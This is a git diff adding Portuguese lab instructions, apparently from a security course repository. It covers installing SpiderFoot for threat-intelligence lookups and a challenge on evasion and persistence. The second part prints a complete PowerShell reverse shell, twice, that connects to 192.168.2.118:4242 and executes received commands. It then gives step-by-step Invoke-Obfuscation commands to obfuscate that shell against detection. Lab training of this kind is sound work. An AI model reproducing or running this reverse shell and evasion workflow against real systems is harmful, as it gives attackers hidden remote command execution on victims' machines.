@@ -266,9 +266,106 @@ cat base64.txt | base64 -d
 ```
 
 ### Desafio 3: Criação de Feed de Threat Intelligence
+SpiderFoot GitHub - https://github.com/smicallef/spiderfoot
 
+- Download da aplicaçaõ
+```
+wget https://github.com/smicallef/spiderfoot/archive/v4.0.tar.gz
+```
+- Descompactação do arquivo
+```
+tar zxvf v4.0.tar.gz
+```
+- Acessando o diretório
+```
+cd spiderfoot
+```
+- Instalando dependências
+```
+pip3 install -r requirements.txt --break-system-packages
+```
+- Instalando módulo adicional
+```
+pip3 install PyPDF2 --break-system-packages
+```
+- Executando a aplicação
+```
+python3 ./sf.py -l 127.0.0.1:5001
+```
+- Acessando a aplicação via navegador:
+http://127.0.0.1:5001
+Realizar pesquisa por endereço de IP ou domínio malicioso.
 
 ### Desafio 4: Simulação de Evasão e Persistência
+GitHub Invoke-Obfuscation - https://github.com/danielbohannon/Invoke-obfuscation
+- Instalação do Powershell no Kali Linux
+```
+sudo apt install -y powershell
+```
+- Download do repositório Invoke-Obfuscation
+```
+git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
+```
+- Acessando o diretório
+```
+cd Invoke-Obfuscation
+```
+- Atribuindo permissões
+```
+chmod 777 *
+```
+- Elevando privilégios para root
+```
+sudo su
+```
+- Executando o PowerShell
+```
+pwsh
+```
+- Importando o módulo Invoke-Obfuscation
+```
+Import-Module ./Invoke-Obfuscation.psd1
+```
+- Carregando o Invoke-Obfuscation
+```
+Invoke-Obfuscation
+```
+Payloads All The Things - https://github.com/swisskyrepo/payloadsallthethings
+
+Payload Shell Reverso - https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell
+
+- Script Reverse Shell - pos.ps1
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.2.118',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+- Setando o path do script pos.ps1
+```
+SET SCRIPTPATH /home/smith/adint/pos.ps1
+```
+- Obfuscate PowerShell Ast nodes
+```
+AST
+```
+- Select All choices from above
+```
+ALL
+```
+- Execute ALL Ast obfuscation techniques
+```
+1
+```
+-  Script Reverse Shell - pos1.ps1
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.2.118',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+
+
+
+
+
+
+
 
 
 
